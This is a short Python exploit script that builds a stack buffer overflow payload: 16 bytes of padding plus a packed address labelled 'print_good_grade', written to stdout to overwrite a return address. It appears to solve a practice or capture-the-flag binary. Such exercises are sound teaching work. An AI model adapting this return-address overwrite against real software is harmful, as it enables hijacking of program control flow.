import sys
import struct

payload = b'a'*16 # pad it out
payload2 = struct.pack("<I", 0x08049c03) # addr of print_good_grade
value = payload+payload2 # padding + addr
sys.stdout.buffer.write(value) # fill up stack which overwrites ret addr
